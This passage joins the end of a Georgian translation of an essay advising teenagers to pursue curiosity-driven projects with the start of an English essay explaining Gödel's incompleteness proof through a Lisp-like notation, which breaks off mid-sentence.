ვგრძნობ. იგივე სიტუაციაა ადამიანებთან, რომლებიც კარგ საქმეებს აკეთებენ.
მათ იციან, რომ ცუდად იგრძნობენ თავს, თუ არ იმუშავებენ, ამიტომ ისინი
საკმაოდ დისციპლინირებულნი არიან საქმის დაწყებისას, და შემდეგ ინტერესი
იწყებს დომინირებას და დისციპლინა აღარ არის საჭირო.

როგორ ფიქრობთ, შექსპირმა კბილების ჭრაჭუნით და დიდი მცდელობით ცდილობდა
დაეწერა თავისი დიდებული ლიტერატურა? რათქმაუნდა არა. ის იღებდა
სიამოვნებას. ამიტომ არის ის ასეთი კარგი.

თუ გსურთ რაიმე კარგის გაკეთება, გესაჭიროება დიდი ცნობისმოყვარეობა,
ინტერესი რაიმე პერსპექტიული თემის საკითხში. აინშტეინისთვის კრიტიკული
მომენტი იყო, როდესაც მან მაქსველის განტოლებები დაათვალიერა და იკითხა: რა
ჯანდაბა ხდება აქ?

პროდუქტიული კითხვის პოვნას შეიძლება წლები დასჭირდეს, რადგან მრავალი წლის
განმავლობაში შეიძლება ძიება, თუ რაშია საქმე. როგორც უკიდურესი მაგალითი,
მოდით განვიხილოთ მათემათიკა. ადამიანების უმეტესობა ფიქრობს, რომ
მათემატიკა სძულთ, მაგრამ მოსაწყენი საქმეები, რასაც სკოლაში აკეთებ
"მათემათიკის" სახელით, სულაც არ ჰგავს იმას, რასაც ნამდვილი
მათემატიკოსები აკეთებენ.

დიდმა მათემატიკოსი გ.გ. ჰარდიმ თქვა, რომ მასაც არ უყვარდა მათემატიკა
სკოლაში. მან ის მხოლოდ იმიტომ აირჩია, რომ სხვა მოსწავლეებთან შედარებით
მას ის უკეთესად გამოზდიოდა. მხოლოდ მოგვიანებით მან აღმოაჩინა, რომ
მათემატიკა საინტერესო იყო - მხოლოდ ამის შემდეგ მან დაიწყო კითხვების
დასმა, ნაცვლად მათზე უბრალოდ სწორი პასუხის გაცემისა.

როდესაც ჩემი მეგობარი წუწუნებდა, რომ მას უნდა დაეწერა დავალება
სკოლისთვის, დედამისი ეუბნებოდა: იპოვე გზა, რომ საინტერესოდ გააკეთო ის,
რისი გაკეთებაც გჭირდება: იპოვე კითხვა, რომელიც სამყაროს გახდის
საინტერესოს. ადამიანები, რომლებიც დიდ საქმეებს აკეთებენ, იგივე სამყაროს
უყურებენ, როგორც ყველა დანარჩენი, მხოლოდ ისინი ამჩნევენ უცნაურ დეტალს,
რომელიც ძალზე იდუმალია.

და ეს არაა მხოლოდ ინტელეკტუარულ საკითხებში. ჰენრი ფორდის დიდი კითხვა
იყო: რატომ უნდა იყოს მანქანა ფუფუნება? რა მოხდებოდა, თუ ის სამომხმარებლო
საქონლად იქცეოდა? ფრანც ბეკენბაუერის კითხვის არსი იყო: რატომ უნდა იდგეს
ყველა თავის პოზიციაზე? რატომ არ შეუძლიათ მცველებსაც გოლების გატანა?

### ახლა

თუ დიდ კითხვის ფორმულირებას წლები ესაჭიროება, რა უნდა გააკეთო ახლა,
როდესაც თექვსმეტი წლის ხარ? იმუშავეთ ასეთი კითხვის მოსაძიებლად. დიდი
კითხვები მოულოდნელად არ ჩნდებიან. ისინი თანდათან ლაგდებიან თავში.
გამოცდილება ეხმარება ამ პროცეს. დიდი კითხვების პოვნის გზა არ არის მათი
ძიება. ესეიგი, იმისათვის რომ დიდი კითხვა იპოვო, არ გჭირდებათ მისი ძებნა
\-- არ უნდა იხეტიალოთ ფიქრებში, თუ რა დიდი აღმოჩენა უნდა მოვახდინო?
თქვენ არ შეგიძლიათ ამ კითხვაზე პასუხის გაცემა; რომ შეგეძლოთ, უკვე
გააკეთებდით ამ აღმოჩენას.

გზა, რომ დიდი იდეა გაგიჩნდეს თავში, არის არა ნადირობა დიდ იდეებზე,
არამედ დიდი დროს დათმობა თქვენთვის საინტერესო საქმისადმი და ამ პროცესში
გონება საკმარისად გახსენით, რომ დიდმა იდეამ შეძლოს თქვენი გატაცება.
აინშტაინმა, ფორდმა, ბეკენბაუერმა - ყველამ გამოიყენა ეს რეცეპტი. მათ
ყველამ იცოდა თავისი სამუშაო, როგორც პიანისტმა იცის კლავიატურა. ამიტომ,
როდესაც მათ ეჩვენებოდათ, რომ რაღაცა არასწორი იყო, მათ საკმარისი
თავდაჯერებულობა ჰქონდათ ამის აღიარებისათვის.

როგორ დავაბანდოთ დრო და რაში? უბრალოდ აირჩიეთ ისეთი პროექტი, რომელიც
თქვენთვის საინტერესოა: იმისათვის რომ მასალას დაეუფლო, გააკეთო რაიმე, ან
უპასუხო რამე კითხვას. შეარჩიეთ პროექტი, რომელის შესრულებას თვეზე ნაკლები
დრო დასჭირდება და ეს იყოს ის, რისი დასრულების საშუალება გაქვთ. გააკეთე
რაიმე ისეთი რთული, რომ დაგძაბოს, მაგრამ მხოლოდ მსუბუქად, განსაკუთრებით
დასაწყისისთვის. თუ თქვენ ირჩევთ ორ პროექტს შორის, აირჩიეთ ის, რაც უფრო
საინტერესოდ გეჩვენება. თუ ერთი პროექტი ჩავარდება, დაიწყეთ მეორე.
გაიმეორეთ სანამ, შიდა წვის ძრავის მსგავსად პროცესი არ გახდება
თვითმართვადი და თითოეული პროექტი არ დაიწყებს შემდეგი პროექტის წარმოებას.
(ამას შეიძლება წლები დასჭირდეს).

შეიძლება გონივრული აღმოჩნდეს, რომ არ გააკეთო პროექტი "სკოლისათვის" თუ ის
გზღუდავთ ან სამუშაოს ამსგავსებს. ჩართე შენი მეგობრები, თუ გინდა, მაგრამ
არც ისე ბევრი და მხოლოდ იმ შემთხვევაში, თუ ისინი არ არიან
უპასუხისგებლოები. მეგობრები გაძლევენ მორალურ მხარდაჭერას (ცოტა კომპანია
იხსნება ერთი ადამიანის მიერ), მაგრამ საიდუმლოებას აქვს თავისი
უპირატესობა. არის რაღაც სასიამოვნო საიდუმლო პროექტში. გარდა ამისა, თქვენ
უფრო მეტი რისკის გაწევა შეგიძლიათ, რადგან ვერავინ გაიგებს, თუ პროექტი
ჩავარდება.

არ ინერვიულოთ, თუ გეჩვენებათ, რომ პროექტმა გადაუხვია იმ გზიდან, რომელზეც
უნდა ყოფილიყავით. გზა შეიძლება იმაზე მეტად გაგრძელდეს ვიდრე ვარაუდობდით.
ამიტომ მიეცით საშუალება გაიზარდოს გზა პროექტიდან გამომდინარე. ამაში
ყველაზე მნიშვენოლვანი არის ის რომ იყო ამ პროცესით აღბრთოვანებული,,
იმიტომ რამ ამ დროს სწავლობ კეთებით.

ნუ უგულებელყოფ უღირსო მოტივებს. ერთ-ერთი ყველაზე ძლიერი მოტივი არის
სურვილი, რომ იყო სხვა ადამიანებზე უკეთესი რაღაცაში. ჰარდიმ თქვა, რომ
ზუსტად ამან მისცა მას საწყისი ბიძგი, და ვფიქრობ, რომ მასში ერთადერთი
უჩვეულო ის არის, რომ მან ეს აღიარა. მეორე ძლიერი მოტივი არის სურვილი
კეთების, ან ცოდნის ისეთი რამის, რაც, შენ თითქოს არ უნდა იცოდე. მასთან
მონათესავო სურვილი არის რაიმე სიმამაცის გაკეთება. იგულისხმება, რომ
თექვსმეტი წლის ბავშვები არ უნდა წერდნენ რომანებს. ამიტომ თუ თქვენ
შეეცდებით, რასაც არ უნდა მიაღწიოთ, შეფასების დადებითი მხარეს აღმოჩნდება;
თუ სრულად ჩავარდებით, ეს მაინც არ იქნება მოლოდინზე უარესი. \[8\]

უფრთხილდით ცუდ მოდელებს. განსაკუთრებით მაშინ, თუ ისინი სიზარმაცეს
ამართლებენ. როდესაც ვსწავლობდი სკოლასი ვწერდი მოკლე
\"ეგზისტენციალისტურ\" მოთხრობებს, როგორიც მინახია ცნობილი მწერლების
ნაწარმოებში. ჩემს მოთხრობებში არ იყო ბეევრი ინტრიგა, მაგრამ ძალიან ღრმა
იყო. მათი დაწერა უფრო ადვილი იყო, ვიდრე გასართობი მოთხრობების. მე უნდა
მცოდნოდა, რომ ეს საფრთხის ნიშანი იყო. სინამდვილეშიც, ჩემი მოთხრობები
საკმაოდ მოსაწყენი იყო; მე აღფრთოვანებული ვიყავი იმ იდეით, რომ დამეწერა
რაღაცა სერიოზული, ინტელექტუალური, ცნობილი მწერლების მსგავსად.

ახლა მე მაქვს საკმარისი გამოცდილება იმის გასაცნობიერებლად, რომ ის
მწერლები ნამდვილად მოსაწყენები იყვნენ. ბევრი ცნობილი ადამიანი აკეთებს
მოსაწყენ საქმეს; მოკლევადიან პერიოდში, ადამიანის მუშაობის ხარისხი
ცნობადობის მხოლოდ მცირე ნაწილია. ნაკლებად უნდა მეფიქრა იმაზე, რომ ისეთი
რამე გამეკეთებინა, რაც მაგრად გამოიყურებოდა და უფრო მეტად მეფიქრა იმაზე,
რაც მომწონდა. სინამდვილეში, ეს არის გზა იყო მაგარი.

მრავალი პროექტის საკვანძო ინგრედიენტი, თითქმის თვითონ პროექტი, არის
კარგი წიგნების ძიება. წიგნების უმეტესობა ცუდია. თითქმის ყველა
სახელმძღვანელო ცუდია \[9\]. ამიტომ ნუ ჩავთვლით, რომ საგანი უნდა
ისწავლებოდეს ნებისმიერი წიგნიდან, რომელიც ხელში მოგხვდებათ. თქვენ
აქტიურად უნდა მოძებნოთ კარგი წიგნების მცირე რაოდენობა.

მნიშვნელოვანია, დაიძრა ადგილიდან და დაიწყოთ კეთება. იმის ნაცვლად, რომ
დაელოდო თუ როდის გასწავლიან, წადი და ისწავლე.

თქვენს ცხოვრებას არ უნდა მართავდნენ მიმღები კომისიის წევრები. თქვენს
საკუთარ ცნობისმოყვარეობას შეუძლია მართოს ის. ცნობისმოყვარეობა
ხელმძღვანელობს ყველა მიზანდასახული ადამიანის ცხოვრებას. თქვენ არ ხართ
ვალდებული ელოდოთ, რომ დაიწყოთ. სინამდვილეში, თქვენ არ უნდა დაელოდოთ, რომ
გახდეთ ზრდასრული. თქვენში არ არის არანაირი გადამრთველი, რომელიც მაგიურად
იბრუნებს, გარკვეულ ასაკში მოხვედრისას ან რომელიმე დაწესებულების
დამთავერბისას. თქვენ ხდებით ზდასრული, როდესაც გადაწყვეტთ პასუხისმგებლობა
აიღოთ თქვენ ცხოვრებაზე. ამის გაკეთება ნებისმიერ ასაკში შეგიძლიათ. \[10\]

ეს შეიძლება სისულელეს გავდეს. თქვენ შეიძლება იფიქროთ, რომ მე მხოლოდ
არასრულწლოვანი ვარ, არ მაქვს ფული, სახლში უნდა ვიცხოვრო და უნდა ვაკეთო
ის, რასაც უფროსები მეუბნებიან მთელი დღე. ისე, უფროსების უმეტესობა მსგავს
რთულ გარემოში მუშაობენ და ამას თავს ართმევენ. თუ ფიქრობთ, რომ იყო ბავშვი
მძიმეა, წარმოიდგინეთ როგორია შვილების ყოლა.

ერთადერთი რეალური განსხვავება ზრდასრულსა და სკოლის მოსწავლეს შორის არის
ის, რომ ზრდასრულები აცნობიერებენ რაღაცების ბოლომდე გაკეთების საჭიროებას,
ხოლო მოსწავლეები - არა. ამგვარი გაცნობიერება დაახლოებით 23 წლის ასაკიში
ხდება. მე წინასწარ გიმხელთ ამ საიდუმლოს, ასე რომ შეუდექი საქმეს.
შეიძლება თქვენ გახდეთ პირველი თაობა, რომელიც არ ინანებს, თუ რამდენი დრო
დაკარგეს სკოლაში.

------------------------------------------------------------------------

Მადლობთ ინგრიდ ბასეთი, თრევორ ბლაქველი, რიჩ დრავესი, დან გრიფინი, სარა
ჰარლინი, ჯესიკა ლივინგსტონი, ჯაკი მაქდონო, რობერტი მორისი, მარკ
ნიტზბერგი, ლისა რანდალი, და აარონ შუართზი რომ ხაიკიტხეს ამისი დრაფტები,
და მეტი შვები რომ დამელაპრაკეს საშუალო სკოლაზე.

------------------------------------------------------------------------

*Thank you Elene Asanidze, Gua Tabidze, Irakli Safareli, Lana Nozadze,
Sandro Asanidze, Shota Giorgobiani, George Parunashvili, Manana
Parunashvili for your immense help in translation.*

# What Gödel Discovered

In 1931, a 25-year-old Kurt Gödel wrote a proof that turned mathematics
upside down. The implication was so astounding, and his proof so elegant
that it was\...kind of funny. I wanted to share his discovery with you.
Fair warning though, I'm not a mathematician; I'm a programmer. This
means my understanding is intuitive and not exact. Hopefully, that will
come to our advantage since I have no choice but to avoid formality 🙂.
Let's get to it.

## Unification

For the last 300 years, mathematicians and scientists alike made
startling discoveries, which led to one great pattern. The pattern was
unification: ideas that were previously thought to be disparate and
different consistently turned out to be one and the same!

Newton kicked this off for physicists when he discovered that what kept
us rooted on the Earth was also what kept the Earth dancing around the
sun. People thought that heat was a special type of energy, but it
turned out that it could be explained with mechanics. People thought
that electricity, magnetism, and light were different, but Maxwell
discovered they could be explained by an electromagnetic field.

Darwin did the same for biologists. It turned out that our chins, the
beautiful feathers of birds, deer antlers, different flowers, male and
female sexes, the reason you like sugar so much, the reason whales swim
differently\...could all be explained by natural selection.

Mathematicians waged a similar battle for unification. They wanted to
find the "core" principles of mathematics, from which they could derive
all true theories. This would unite logic, arithmetic, and so on, all
under one simple umbrella. To get a sense of what this is about,
consider this question: How do we *know* that 3 is smaller than 5? Or
that 1 comes before 2? Is this a "core" principle that we take on faith
(the formal name for this is called an "axiom") or can this be derived
from some even more core principle? Are numbers fundamental concepts, or
can they be derived from something even more fundamental?

## Crisis

Mathematicians made great progress in this battle for core principles.
For example, a gentleman called Frege discovered that he could craft a
theory of sets, which could represent just about everything. For
numbers, for example, he could do something like this:

![A demonstration of how to represent numbers with
sets](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk5MjkyOTc0LWZhMTE3MjgwLTI4MGYtMTFlYi05MTM1LTVkYjRkZWFlZjgzYy5wbmc)

Here, he represents 0 the empty set. 1 as the set which contains the set
for 0. 2 as the set that contains the set for 1 and 0. From this he
could set a principle to get the "next" number: just wrap all previous
numbers in a set. Pretty cool! Frege was able to take that and prove
arithmetic rules like "1 + 1", "numbers are infinite", etc.

This looked formidable and cool, but Bertrand Russell came along and
broke the theory in one fell swoop.

He used the rules that Frege laid out to make a valid but *nonsensical*
statement. He proved something analogous to 1 + 1 = 3 \[1\]. This sounds
innocuous; it was after-all just *one* statement. But nevertheless it
was disastrous for a foundational theory of mathematics. If you could
prove that 1 + 1 = 3, then you can't really trust any true statement
that results from this foundation.

This put mathematicians on a tail-spin. They even dubbed this period the
"Foundational Crisis of Mathematics"

## Hilbert's Program

In an effort to solve this problem, a mathematician called Hilbert laid
down some requirements for what a fundamental theory of mathematics had
to look like \[2\]. He said that this theory must be a new language,
with a set of rules that satisfied two primary constraints:

The theory would need to be able to prove *any* true mathematical
statement. For example, imagine the statement 1 + 1 = 2. If this
language can't prove that statement, then it certainly can't prove all
of mathematics. Hilbert called this quality **completeness.** The
language would need to be complete.

The second hard requirement, as we discussed earlier, was that it *could
not* prove a false mathematical statement. If we could prove 1 + 1 = 3,
then all was for naught. Hilbert called this **consistency.** The
language would need to be consistent.

## Russell and Whitehead

Bertrand Russell, the gentleman who broke Frege's theory, worked
together with Alfred North Whitehead to develop a theory of their own.
They labored for years to craft an immense volume of work, called
Principia Mathematica \[3\].

They started by writing a new language (let's call it PM) with a few
simple rules. They took those rules, and proceeded to prove a bunch of
things. Russell and Whitehead took almost nothing on faith. For example,
let's look at this almost-impossible-to-read proof over here (don't
worry, you don't need to understand the syntax for this essay):

![An example, very hard-to-read proof from Principia
Mathematica](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk5MjkzMDA0LTA0Y2MwNzgwLTI4MTAtMTFlYi05ZGJkLTRkMTlmYmQxMDM2My5wbmc)

This proof showed that "1 + 1", does indeed equal "2". It took 2 volumes
to get here.

Their language was dense and the work laborious, but they kept on
proving a whole bunch of different truths in mathematics, and so far as
anyone could tell at the time, there were no contradictions. It was
imagined that at least in theory you could take this foundation and
eventually expand it past mathematics: could you encode in pure logic
how a dog behaves, or how humans think?

## Gödel Comes Along

It certainly looked like Principia Mathematica could serve as the
foundational theory for Mathematics. Until Gödel came along.

He proved that Principia Mathematica *did indeed have* true mathematical
statements which *could not be proven* in the language. Principia
Mathematica was incomplete.

This was startling, but his proof went even further. He showed that the
entire enterprise behind Hilbert's Program --- to find a formal
foundation for mathematics --- could *never* work.

It's hard to believe that a person could really prove that something can
"never" happen. Yet here Gödel was\...a 25 year-old who proved beyond a
doubt that this enterprise was impossible. He did this by showing that
if a language could represent numbers, then unprovable statements would
necessarily pop up.

Let's think about that for a second: Numbers seem so quaint and easy to
prove --- just "1", "2", "3"\...so on. People thought we could
eventually write down how humans think --- imagine how shocked they must
have been to see that we couldn't prove all truths about\...numbers.

Let's see how Gödel did it.

## PM-Lisp

Now Russel and Whitehead's language was hard to read. There's no harm
done in changing some of their symbols around. Let's map their language
to something more amenable to programmers: Lisp!

You can imagine that Russell and Whitehead came up with a lisp-like
language. Here's how their syntax looked:

First, they had a few symbols for arithmetic.

**Symbol**

**Meaning**

**Example**

0

zero

`0`

next

the next successor

`(next 0)`

-   

plus

`(+ 0 (next 0))`

-   

times

`(* 0 (next 0))`

=

equals

`(= 0 (* 0 (next 0)))`

Just from these symbols, they could represent all natural numbers. If
they proved that the symbol `0` worked like 0. and the symbol `next`
worked like a successor function, then `(next 0)` could represent 1,
`(next (next 0))` could represent 2, and so on.

Here's how they could write `1 + 1 = 2`:

\[code\]

    (= (+ (next 0) (next 0)) 
       (next (next 0)))

\[/code\]

Now, for the purpose of this essay, I'll add one rule. If you ever see
me using a natural number inside PM-Lisp other than 0 (i.e "15"), you
can imagine it's shorthand to writing `(next (next (next ...))))` that
many times. In this case, "15" means `next` applied to 0, 15 times

**Symbol**

**Meaning**

**Example**

`<natural-number>`

`(next (next ...))` applied to `0` `<natual-number>` times

`3`

*means* `(next (next (next 0)))`

(Next (pun-intended)), they came up with some symbols to represent
logic:

**Symbol**

**Meaning**

**Example**

not

not

`(not (= 0 1))`

or

or

`(or (= 0 1) (not (= 0 1)))`

when

when \... then ..

`(when 0 (or 0 1))`

*when 0, then there is either 0 or 1*

there-is

there is \... such that \...

`(there-is x (= 4 (* x 2))`

These symbols map closely to the logical statements we are used to in
programming. The most unusual one is `there-is`. Let's see one of those
for an example:

\[code\]

    (there-is x (= 4 (* x 2)))

\[/code\]

This is making a statement, that there is some number `x`, such that
`(* x 2)` equals 4. Well, that is indeed true: `x = 2`. That's pretty
cool --- we've just made a general arithmetic statement.

Where did the `x` come from though? Oops, we need to account for that in
our language:

**Symbol**

**Meaning**

a\...z, A\...Z

variable

In order to represent general truths, Russell and Whitehead introduced
variables. Here's how they could derive `and` for example:

\[code\]

    (not (or (not A) (not B)))

\[/code\]

When this statement is `true`, both `A` and `B` must be true!

Very cool. One more trick for our essay. To make it a bit easier to
read, sometimes I'll introduce new symbols. They won't actually be a
part of the language, but it can make good shorthand for us in the essay

**Form**

**Meaning**

**example**

`(def <name> <formula>)`

define `<name>` to represent `<formula>`

`(def and (not (or (not A) (not B)))`

*same as* `(and <var-a> <var-b>...)`

Now we can write `(and 1 2)` 🙂

## PM-Lisp Axioms

All we saw above were *symbols.* They had no meaning yet.

Russell and Whitehead needed to prove that `0` works like zero, and that
`=` works like equals. In order to breathe life into those symbols, they
started off with some core principles --- the axioms.

Here's what they chose:

**Axiom**

**Example**

`(when (or p p) p)`

when either apples or apples, then apples

`(when p (or p q))`

when apples, then either apples or bananas

`(when (or p q) (or q p))`

when either apples or bananas, then either bananas or apples

`(when (or p (or q r)) (or q (or p r))`

when either apples, bananas, or pears, then either bananas, apples, or
pears

`(when (when q r) (when (or p q) (or p r))`

when apples are a fruit, then bananas or apples implies bananas or
fruits

That's it. This is all we needed to take them on faith for. They took
these rules and laboriously combined them in intricate ways to derive
everything else.

For example, here's how they derived `=`:

\[code\]

    (def = (and (when A B) (when B A)))

\[/code\]

If A implies B, and B implies A, they *must* be equal! Imagine this done
for hundreds and hundreds of pages.

Note something essential here: their rules are so precise that there is
no room for human judgement; a computer could run them. This was a key
component for a foundational theory of mathematics: if the rules were so
simple that they could be run as an algorithm, then we could side-step
errors in human judgement.

## Gödel's First Idea

Now, Gödel wanted to study Russell and Whitehead's language. But, it's
hard to study symbols. How do you reason about relationships between
them?

Well, there there is one thing you can study very well\...numbers! So he
came up with an idea: what if he could express all of PM-Lisp with
numbers *?*

This is what he did:

### Symbols

First, he took all the symbols and assigned a number to them:

**Symbol**

**Gödel Number**

(

1

)

3

0

5

next

7

-   

9

-   

11

=

13

not

15

or

17

when

19

there-is

21

a

2

b

4

c

6

\...

\...

Now, say he wanted to write `when`. He could just write `19`. This is
good but doesn't cover much: how would he represent formulas?

### Formulas

He crafted a solution for formulas too. He made a rule:

Take any formula, like this one:

\[code\]

    (there-is a (= (next 0) a))

\[/code\]

and convert each symbol to the corresponding Gödel Number:

**token**

(

there-is

a

(

=

(

next

0

)

a

)

)

**Gödel Number**

1

21

2

1

13

1

7

5

3

2

3

3

Then take the list of ascending prime numbers, and set each one to the
power of the Gödel Number:

**prime** **Gödel** **Number**

2¹

3²¹

5²

7¹

11¹³

13¹

17⁷

19⁵

23³

29²

31³

37³

Multiply them all together, and you get this one huuge number:

\[code\]

    25777622821258399946386094792423028037950734506637287219050

\[/code\]

There's something very interesting about this number. Because it is
comprised only of ascending prime numbers, it's *guaranteed* to be
unique! This means that he could represent *every* formula of PM-Lisp,
with a unique Gödel Number!

### Proofs

Formulas are great, but they're not all of PM-Lisp. We'd also want to
support proofs. In a proof, we would have a "sequence" of formulas:

\[code\]

    (there-is a (= (next 0) a)) 
    (there-is a (= a (next 0)))

\[/code\]

He applied the same trick again, but this time over each individual
formula:

**Gödel Formula**

`(there-is a (= (next 0) a))`

`(there-is a (= a (next 0)))`

**Gödel Number**

25777622821258399946386094792423028037950734506637287219050

76887114166817775146256448336954145299389470803180389491850

**prime Gödel Number**

225777622821258399946386094792423028037950734506637287219050

376887114166817775146256448336954145299389470803180389491850

Now if we took

\[code\]

    2^25777622821258399946386094792423028037950734506637287219050 * 3^76887114166817775146256448336954145299389470803180389491850

\[/code\]

We'd have one ginormous number. Just the first term in this calculation
has 7 octodecillion *digits*! (1 octodecillion has 58 digits itself) But
we'd have something more. This ginormous number uniquely represents the
proof we just wrote!

All of a sudden, Gödel could represent symbols, formulas, and *even*
proofs, uniquely with Gödel Numbers!

## PM-Lisp on PM-Lisp

Now, we can use math to study relationships between numbers: for example
"how are even numbers and prime numbers related?", "are prime numbers
infinite?" and so on. In the same way that we could use math to study
prime numbers, Gödel realized that he could use math to study "all the
numbers that represent PM-Lisp proofs"!

Now, what language could he use to study these relationships? Well,
Russell and Whitehead made sure PM-Lisp itself was great for studying
numbers\...and it certainly worked well for studying primes\...so why
not use PM-Lisp to study "all the numbers that represent PM-Lisp
proofs"?

And that's exactly what Gödel did: he used PM-Lisp\...to study PM-Lisp!

It's certainly not what Russell and Whitehead had intended, but it was
nevertheless possible. Let's take a look at some examples, to get a
sense of what we mean.

### Describing formulas

Say you had a formula like this:

\[code\]

    (there-is a (= (next 0) a)) 

\[/code\]

What if we wanted to prove the statement "The second symbol in this
formula is 'there-is'"?

Well, if we had the Gödel Number for this:

\[code\]

    25777622821258399946386094792423028037950734506637287219050

\[/code\]

All we'd have to do, is to say in PM-Lisp:

"The largest 3\* factor of this Gödel Number is 321".

If we said that\...it would be equivalent to saying that the *second*
symbol (the prime number 3), is "there-is" (Gödel Number 21)! Very cool.

Well, that relationship is trivial to say in PM-Lisp. Let's start by
writing a formula to check if a number is a factor of another:

\[code\]

    (there-is x (= (* x 5) 30))

\[/code\]

This statement says that there is an `x` such that `(* x 5)` must equal
`30`. If `x = 6`, this works out, so the statement is true. Well, that
maps to the idea that 5 is a factor of 30! So let's make this a
"factoring" shortcut:

\[code\]

    (def factor? (there-is x (= (* x y) z)))

\[/code\]

We can then use `factor?` for our statement:

\[code\]

    (and
      (factor? x 3^21 25777622821258399946386094792423028037950734506637287219050)
      (not (factor? x 3^22 25777622821258399946386094792423028037950734506637287219050)))

\[/code\]

This statement says that 321 is a factor of our number, and that 322 is
not. If that is true, it means that 321 is the largest 3\* factor in
`25777622821258399946386094792423028037950734506637287219050`. And if
[that is
true](https://www.wolframalpha.com/input/?i=factorize+25777622821258399946386094792423028037950734506637287219050),
then PM-Lisp just said *something* about that formula: it said the
second symbol *must* be `there-is`!

### Constructing formulas

We can go further. We can even *construct* PM-Lisp formulas in PM-Lisp!
Imagine we had a bunch of helper statements for primes and exponents:

\[code\]

    (def prime? ...) ; (prime? 5) ; true
    (def largest-prime ...) ; (largest-prime 21) ; 7
    (def next-prime ...) ; (next-prime 7) ; 11
    (def expt ...) ; (expt 10 3) ; 1000

\[/code\]

Since PM-Lisp is all about math, you can imagine Russell and Whitehead
went deep into primes and gave us these handy statements. Now, we could
write a formula that "appends" a `)` symbol, for example:

\[code\]

    (* n (expt (next-prime (largest-prime n)) 3))

\[/code\]

Say `n` was the Gödel Number for `(there-is a (= (next 0) a))`.

Here's what that statement says:

-   Find the largest prime for `n`: 37
-   get the next prime after that: `41`
-   Multiply `n` by 413

Multiplying `n` by 413 would be equivalent to appending that extra `)`!
Mind bending.

## (successor? a b)

Now, Gödel started wondering: what other kinds of statements could we
construct? Could we make a statement like this:

\[code\]

    (successor? a b)

\[/code\]

This would say: "the formula with the Gödel Number `a` implies the
formula with the Gödel Number `b`."

It turns out\...this is a valid, provable statement in PM-Lisp! The
mathematical proof is a bit hard to follow, but the intuitive one we can
grasp well.

Consider that in PM-Lisp, to go from one statement to the next
statement, it *must* boil down to one of the axioms that Russell and
Whitehead wrote out!

For example from the sentence `p`, we can apply the axiom
`(when p (or p q))`, so one valid next statement can be `(or p q)`. From
there, we can use more axioms: `(when (or p q) (or q p)` can help us
transform this to `(or q p)`. And so on.

We already saw that we can use PM-Lisp, to "change" around formulas
(like how we added an extra bracket at the end). Could we write some
more complicated statements, that can "produce" the next possible
successors, from a statement and those axioms?

As one example, to go from `p` to `(or p q)` we'd just need a
mathematical function that takes the Gödel number for `p`, and does the
equivalent multiplications that prepend `(or`, and appends `q)`.

Turns out, this *can* be done with some serious math on prime numbers!
Well, if that's possible, then we *could* check whether the *next*
statement in a sequence is valid:

\[code\]

    (def successor?
      (one-of b (possible-successors a)))

\[/code\]

This statement says "one of the possible successor Gödel Numbers from
the formula with Gödel Number `a` , equals the formula with the Gödel
Number `b`." If that is true, then indeed `b` must be a successor of
`a`.

Nice! PM-Lisp can say that one formula implies another.

## (proves a b)

If we can prove that that a formula is a successor, can we say even
more?

How about the statement `(proves a b)`. This would say: "the *sequence*
of formulas with the Gödel Number `a` *proves* the formula with the
Gödel Number `b`.\"

Well, let's think about it. Getting a "list" of Gödel Number formulas
from `a` is pretty straight-forward: just extract the exponents on prime
numbers. PM- Lisp can certainly do that.

Well, we already have a `successor?` function. We could just apply it to
every statement, to make sure it's a valid successor!

\[code\]

    (and 
      (every-pair sucessor? (extract-sequence a))
      (successor? (last-formula a) b))

\[/code\]

There's a lot of abstraction over there that I didn't talk about ---
`every- pair`, `extract-sequence`, etc --- but you can sense that each
one is certainly a mathematical operation: from extracting exponents to
checking that a Gödel Number is a proper successor.

The statement above would in effect say:

\"Every formula in the sequence with the Gödel Number `a` are proper
successors, and imply the Gödel Number `b`.\"

Gödel went through a lot of trouble to prove this in his paper. For us,
I think the intuition will do. Using PM-Lisp, we can now say some deep
truths about PM-Lisp, like "this proof implies this statement\" ---
nuts!

## (subst a b c)

There's one final statement he proved. Imagine we had this formula

\[code\]

    (there-is b (= b (next a)))

\[/code\]

The Gödel number would be
`26699108848097731568417316859014651425159900891216992323750`

This says "There is a number `b` that is one greater than `a`."

What if we wanted to replace the symbol `a` with `0`?

Well, this would be a hard but straight-forward thing: we just need to
replace all exponents that equal `2` in this number (remember that `2`
is the Gödel Number for the symbol `a`), with `5`. (the Gödel Number for
`0` )

\[code\]

    (replace-exponent
      26699108848097731568417316859014651425159900891216992323750
      2 
      5)

\[/code\]

Again, this seems pretty straight-forward mathematical computation, and
we can sense that PM-Lisp could do it. It would involve a lot of math
--- extracting exponents, plopping multiplications --- but all within
reasonable logical realms.

Gödel proved that *this* function was also a provable statement in
PM-Lisp. Our expression above for example, would produce the Gödel
Number that represented this formula:

\[code\]

    (there-is b (= b (next 0)))

\[/code\]

Wild! `a` replaced with `0`. PM-Lisp could now make substitutions on
PM-Lisp formulas. I imagine that when Russell and Whitehead saw this,
they started getting a little queasy.

## Suspicious use of subst

If they weren't already queasy, this certainly would make them so:

\[code\]

    (subst 
      26699108848097731568417316859014651425159900891216992323750
      2 
      26699108848097731568417316859014651425159900891216992323750)

\[/code\]

This replaces `a`, with the *Gödel Number of the formula itself!*

In this case, the formula would now say:

\[code\]

    (there-is b (= b (next 25777622821258399946386094792423028037950734506637287219050))) 

\[/code\]

It's weird to use the Gödel Number of a formula itself inside the
formula, but it *is* a number at the end of the day, so it's all kosher
and logical.

Very cool: PM-Lisp can now say if a certain proof is valid, and it can
even replace variables inside formulas!

## Masterpiece

Gödel combined these formulas into a jaw-dropping symphony. Let's follow
along:

He starts with this:

\[code\]

    (proves a b)

\[/code\]

So far saying "the sequence with the Gödel Number `a` proves the formula
with Gödel Number `b`"

Next, he brought in a `there-is`

\[code\]

    (there-is a (proves a b))

\[/code\]

So far saying "There is some sequence with the Gödel Number `a` that
proves the formula with the Gödel Number `b`\"

Now, he popped in a `not`:

\[code\]

    (not (there-is a (proves a b)))

\[/code\]

This would mean

"There is *no* sequence that proves the formula with the Gödel Number
`b`\"

Then he popped in `subst`:

\[code\]

    (not (there-is a (proves a (subst b 4 b))))

\[/code\]

Wow what. Okay, this is saying

"There is *no* sequence that proves the formula that results when we
take The Gödel Number for `b`, and replace `4` (the Gödel Number for the
